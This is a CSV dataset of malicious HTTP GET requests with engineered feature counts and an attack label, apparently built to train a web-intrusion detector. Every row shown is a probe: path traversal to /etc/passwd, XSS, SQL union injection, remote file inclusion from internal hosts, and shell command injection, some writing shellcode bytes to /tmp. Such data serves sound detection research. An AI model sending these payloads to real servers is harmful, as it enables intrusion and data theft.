method,path,body,path_len,useragent_len,host_len,spaces,curly_open,curly_close,brackets_open,brackets_close,greater_than,lesser_than,single_quote,double_quote,directory,semi_colon,double_dash,amp,blacklist,label 
GET,"/examples/jsp/jsp2/jspx/admin/addentry.php?phpbb_root_path=/etc/passwd\x00
",,75,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/tomcat-docs/appdev/sample/web/hello.jsp?test=<script>alert(tomcat_sample_hello_xss.nasl)</script>
",,99,115,0,0,0,0,1,1,2,2,0,0,0,0,0,0,0,1
GET,"/admin/index.php?path_to_script=http://192.168.202.96:8080/4dckqcc0acprbz??&cmd=ls
",,83,115,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,1
GET,"/_vti_bin/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\+/og
",,96,115,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1
GET,"/rpc/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
",,96,115,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1
GET,"/javascript/toggle.exe
",,23,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/f.exe
",,18,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/phpmyadmin/documentation.html?phpmyadmin=print(md5(acunetix_wvs_security_test));die();/*
",,90,115,0,0,0,0,3,3,0,0,0,0,0,0,0,0,0,1
GET,"/recordings/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1
",,111,115,0,0,0,0,2,2,0,0,4,0,0,0,0,3,0,1
GET,"/cfide/scripts/ajax/fckeditor/editor/filemanager/connectors/cfm/upload.cfm?command=fileupload&type=file&currentfolder=/flkzzubocd.jsp\x00
",,138,115,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1
GET,"/nyvbv05h.pl?<script>document.cookie=""testftxz=5980;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222"" >> /tmp/gjvtlghpjb0;echo|awstats360621.txt
",,146,115,0,4,0,0,0,0,2,0,0,2,0,0,0,0,0,1
GET,"/vac1l5vm.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/manager/sources/functions.php?root_path=/etc/passwd\x00
",,57,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/""france 24""/
",,14,115,0,1,0,0,0,0,0,0,0,2,0,0,0,0,0,1
GET,"/recordings/smpwservicescgi.exe
",,32,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/cgi-bin/snpfiltered.pl?t=c&u=<script>foo</script>
",,51,115,0,0,0,0,0,0,2,2,0,0,0,0,0,1,0,1
GET,"/examples/jsp/num/index.php?id=urjhxcl19w'
",,43,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/prescript/
",,12,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/cars.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/manager/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>
",,97,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/javascript/document.war
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/sc877q2pzqne.shtml
",,28,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/phpmyadmin/demos/demo.browse.php?filename=/etc/passwd
",,55,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/vhzmaia2.php?<script>document.cookie=""testkogj=3979;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/r3le3om5.pl?<script>cross_site_scripting.nasl</script>
",,56,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/hipkz026.exe?<script>document.cookie=""testyrbs=2855;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/cgi.cgi/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
",,87,115,0,0,0,0,0,0,0,0,0,0,7,0,0,1,0,1
GET,"/.htpasswd
",,11,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/basilix.php
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/jsp-examples/cal/cal2.jsp?time=8am<script>alert(""tomcat_sample_cal2_xss.nasl"")</script>
",,89,115,0,0,0,0,1,1,2,2,0,2,0,0,0,0,0,1
GET,"/j734qobz.idc?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/bin/c32web.exe/getimage?imagename=customeremail.txt\x00.pdf
",,61,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331905161
",,126,115,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,1
GET,"/9kr0ih0v.exe?<script>document.cookie=""testzgnm=1183;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/1r8cfrlf.php?<meta http-equiv=set-cookie content=""testydan=5106"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/main.php?stuff=ping;-w;11000;-n;1;4.3.2.1|rem;
",,48,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/rubberstampsscriptalphabet/
",,29,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/llumt7msyau5y?
",,74,115,0,0,0,0,0,0,0,0,0,2,0,2,0,0,0,1
GET,"/main.php?logout=""rm\x0bq12574322&rem\x0b
",,42,115,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/i7prbs22.html?<meta http-equiv=set-cookie content=""testjnre=7328"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/scripts/wihphoto/start.php
",,28,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/weq93ppb.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,70,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/zln2hm2z.fts?<meta http-equiv=set-cookie content=""testblcp=8120"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/ghswfouu.jsp?<script>document.cookie=""testsqmm=5713;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/adodb/server.php?sql='adodb_sql_sql_injection.nasl
",,52,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/y8pmygrp.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,69,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/top.php?stuff='uname >q24953383 #
",,35,115,0,2,0,0,0,0,1,0,1,0,0,0,0,0,0,1
GET,"/manager/index.php?show=../../../../../../../../../../../etc/passwd\x00
",,72,115,0,0,0,0,0,0,0,0,0,0,11,0,0,0,0,1
GET,"/cgi-bin/prn/../../../../../../../../../winnt/system32/ipconfig.exe
",,68,115,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,1
GET,"/help.php?q=;rm\x09q81281166\x09#
",,34,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/checkbox/index.php?cat_select=<script>foo</script>
",,65,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/servlet/webacc?user.lang=<script>foo</script>
",,47,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/help.php?q=""ping\x0c-w\x0c10000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c
",,63,115,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/xfkun1ku.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/javascript/post.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/en-us/oie504mr.cfm?<script>document.cookie=""testtpby=7052;""</script>
",,70,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/hrttz9fj.htm?<script>document.cookie=""testtbjy=7334;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/aj3pf49c.jspa?<script>document.cookie=""testnofv=4170;""</script>
",,65,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/htpasswd.c
",,23,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/copying/</p><body><script src=http://www.example.com/test?rnd=q64711831></script><p>
",,86,115,0,1,0,0,0,0,5,5,0,0,0,1,0,0,0,1
GET,"/javascript/sl.exe
",,19,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/jsp2/jspx/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id
",,88,115,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/javascript/.web.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/zln2hm2z.htm?<meta http-equiv=set-cookie content=""testblcp=8120"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/ju0u7kfo.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/bmeun223.pl?<script>document.cookie=""testhhwu=7044;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/ht8pn8uq.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/help.php?q='\x0adel\x09q79344163\x09#
",,39,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/help.php?q=""ping;-w;10000;-n;1;1.2.3.4|rem;
",,45,115,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/.../.../.../.../.../.../.../.../.../windows/win.ini
",,53,115,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,1
GET,"/examples/servlets/servlet/starnet/addons/slideshow_full.php?album_name='1978429620
",,84,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/vac1l5vm.php3?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/javascript/presentations.exe
",,30,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/help.php?q=""rm q92991511 #
",,28,115,0,2,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/xsqln7eb.php3?<meta http-equiv=set-cookie content=""testpcbb=9254"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/script/ident/loginliste.php?path_inc=http://192.168.202.96:8080/4dckqcc0acprbz?
",,81,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/33y9gcqq.x?<script>document.cookie=""testnvxc=4301;""</script>
",,62,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/en-us/account/index.php?op=default&date=200607' union select 1,674790948,1,1,1,1,1,1,1,1--&blogid=1
",,101,115,0,3,0,0,0,0,0,0,1,0,0,0,1,2,0,1
GET,"/javascript/monitor.exe
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/h3d1n9eaqxv3.html
",,27,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/jsp2/jspx/kernel/loadkernel.php?installpath=/etc/passwd\x00
",,74,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/xssxmltest/
",,13,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/help.php?q=""&uname #
",,22,115,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/dslpwt15.php3?<meta http-equiv=set-cookie content=""testtkio=5454"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/examples/servlets/servlet/al_initialize.php?alpath=/etc/passwd\x00
",,68,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/ao22ww7y.php3?<script>document.cookie=""testqppc=8767;""</script>
",,65,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/cacti/index.php?sensor_program=<script>alert('phpsysinfo_multiple_xss.nasl');</script>
",,88,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/7o5qp766.cfm?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/main.php?logout=""ver\xa0>q32937989&rem\xa0
",,44,115,0,0,0,0,0,0,1,0,0,1,0,0,0,1,0,1
GET,"/scripts/icat
",,14,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/6wb70v0b.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/5qnlm5z2.jspa?<script>document.cookie=""testsixi=8451;""</script>
",,65,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/hipaa.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/manager/faq.php?action=&type=view&s=&id=-1' union select 0,348320449,0,0,0,0,0--
",,82,115,0,3,0,0,0,0,0,0,1,0,0,0,1,3,0,1
GET,"/if69ddo1.mscgi?<meta http-equiv=set-cookie content=""testiabz=5220"">
",,69,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/scripts/faxsurvey?cat /etc/passwd
",,35,115,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/filez.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/script_path/config.inc.php?_path=http://192.168.202.96:8080/4dckqcc0acprbz??
",,78,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/en-us/account/index.pl/homels?func=add;class=webgui::asset::wobject::article;print `id`;
",,90,115,0,1,0,0,0,0,0,0,0,0,0,6,0,0,0,1
GET,"/scripts/file.php?path=/etc/passwd\x00
",,39,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/6wb70v0b.mscgi?<script>cross_site_scripting.nasl</script>
",,59,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/iktok2bw.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/en-us/jnv890lt.cfc?<script>cross_site_scripting.nasl</script>
",,63,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/cgi-bin/index.php?search='><script>alert('autoindex_search_xss.nasl');</script>&searchmode=f
",,94,115,0,0,0,0,1,1,3,2,3,0,0,0,0,1,0,1
GET,"/r3le3om5.cfm?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/main.php?logout=';rm\x09q16263765\x09#
",,40,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/recordings/mmstdod.cgi?alternate_templates=| echo ""content-type: text/html"";echo """" ; id\x00
",,94,115,0,6,0,0,0,0,0,0,0,4,0,1,0,0,0,1
GET,"/main.php?stuff=""\x0arm\x09q48139983\x09#
",,42,115,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/nigdyniewieszcomo\xbfeszzyska\xe6atakwieledostraceniajest:&#40;/
",,66,115,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1
GET,"/scripts/bveygnpo6hkw.pl
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/j4drbkil.fts?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/javascript/gump.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/<script>cross_site_scripting.nasl</script>.nsf
",,48,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/main.php?logout=;del\x09q38215685\x09#
",,40,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/<script>document.cookie=""testxagh=6987;""</script>
",,51,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/en-us/fo564rei.x?<script>cross_site_scripting.nasl</script>
",,61,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+8b+ec+50+60+6a+04+5a+50+8b+dc+e8+41+00+00+00+6a+00+68+6c+6c+6f+63+68+75+61++>>ctdn
",,150,115,0,0,0,0,0,0,2,0,0,1,0,0,0,1,0,1
GET,"/<meta http-equiv=set-cookie content=""testwldz=3506"">
",,54,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/javascript/definition.exe
",,27,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/nyvbv05h.x?<script>document.cookie=""testftxz=5980;""</script>
",,62,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/en-us/account/claroline/resourcelinker/resourcelinker.inc.php?clarolinerepositorysys=/etc/passwd\x00
",,102,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/help.php?q='\x0adel q19373947 #
",,33,115,0,2,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/javascript/rhtml.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/t7tm4m0b.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/cacti/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331909287')</script>
",,95,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/roads/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd\x00
",,75,115,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,1
GET,"/javascript/document.gz
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/txenjrxf3?
",,70,115,0,0,0,0,0,0,0,0,0,2,0,2,0,0,0,1
GET,"/javascript/assets.exe
",,23,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/fo564rei.mscgi?<script>cross_site_scripting.nasl</script>
",,59,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/cgi-bin/index.php?id='union/**/select/**/0,0,763560836,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
",,96,115,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1
GET,"/zmvq66jy.nsf?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/javascript/space.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/edzaia0i.dll?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/examples/jsp/num/index.php?site=../../../../../../../../etc/passwd\x00
",,72,115,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,1
GET,"/jw64yq8u.cfm?<meta http-equiv=set-cookie content=""testylfu=1313"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/cgi-bin/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||
",,88,115,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/examples/jsp/error/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
",,128,115,0,1,0,0,0,0,0,0,0,0,0,0,0,4,0,1
GET,"/iktok2bw.pl?<script>cross_site_scripting.nasl</script>
",,56,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/eei78ore.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,69,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/phpmyadmin/documentation.html?phpmyadmin=&cat /etc/passwd&
",,60,115,0,1,0,0,0,0,0,0,0,0,0,0,0,2,0,1
GET,"/....\....\....\....\....\....\....\....\....\windows\win.ini
",,62,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/mpcgi/sensepost.exe?/c+dir
",,28,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/cgi-bin/visitor.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/rx9ysf2iwv4j.pl
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/7u1pb2xi.htm?<script>document.cookie=""testlwwz=718;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/scripts/blog/mt-check.cgi
",,27,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/zq9frlz6fcfp.php3
",,27,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/cgi-bin/index.php?act=arcade&do=stats&gameid=1'
",,49,115,0,0,0,0,0,0,0,0,1,0,0,0,0,2,0,1
GET,"/cgi-bin/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl
",,70,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd
",,104,115,0,0,0,0,0,0,0,0,0,0,14,0,0,1,0,1
GET,"/phpmyadmin/includes/converter.inc.php?include_path=/etc/passwd\x00
",,68,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
",,107,115,0,3,0,0,0,0,0,0,3,0,0,0,1,0,0,1
GET,"/scripts/2sfdqydfaknx.pl
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/help.php?q=""&rm;q83399542&rem;
",,32,115,0,0,0,0,0,0,0,0,0,1,0,0,0,2,0,1
GET,"/scripts/bpk_bsfe_4vq.sh
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/8t9v8k7x.nsf?<script>document.cookie=""testhvje=9403;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"//..\..\..\..\..\..\..\..\etc/passwd
",,37,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
",,72,115,0,0,0,0,0,0,0,0,0,0,1,0,0,2,0,1
GET,"/t7tm4m0b.fts?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/weq93ppb.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/scripts/www/delivery/fc.php?max_type=../../../../../../../../../../etc/passwd\x00
",,83,115,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,1
GET,"/javascript/devel.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/login/sm_login_screen.php?uid=\""><script>alert('vulnerable')</script>
",,71,115,0,0,0,0,1,1,3,2,2,1,0,0,0,0,0,1
GET,"/cgi-sys/c32web.exe/changeadminpassword
",,40,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/cgis/ion-p?page=../../../../../etc/passwd
",,43,115,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,1
GET,"/en-us/i686v90l.cgi?<script>document.cookie=""testfutf=1550;""</script>
",,70,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/maps.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/recordingsmultihtml.pl?multi=/etc/passwd\x00html
",,50,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/index.php?config[""sipssys""]=http://192.168.202.118:8080/ghl9il?
",,65,115,0,0,0,0,0,0,0,0,0,2,0,2,0,0,0,1
GET,"/g8nu2yy7.html?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/jnt3f86c.php?<script>document.cookie=""testcmax=9270;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/examples/jsp/sessions/search.cgi?..\..\..\..\..\..\winnt\win.ini
",,66,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/en-us/account/review.php?id=1&cat=&subcat=""><script>alert('phpmydirectory_multiple_xss.nasl');</script>
",,105,115,0,0,0,0,1,1,3,2,2,1,0,0,0,2,0,1
GET,"/a.jsp/<script>alert('vulnerable')</script>
",,44,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/script//ident/index.php?path_inc=http://192.168.202.118:8080/ghl9il?
",,70,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/33y9gcqq.idc?<meta http-equiv=set-cookie content=""testnvxc=4301"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/main.php?stuff=""\x0auname >q72652917 #
",,40,115,0,2,0,0,0,0,1,0,0,1,0,0,0,0,0,1
GET,"/comments.php?scriptpath=http://192.168.202.118:8080/moclyxlwqyfjnp??
",,70,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/javascript/.passwd.orig
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/v3axg1p8.dll?<meta http-equiv=set-cookie content=""testxagh=6987"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/subscriptions.orig
",,20,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/1r8cfrlf.asp?<meta http-equiv=set-cookie content=""testydan=5106"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/5o9zq43e.jspa?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/scripts/mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
",,71,115,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1
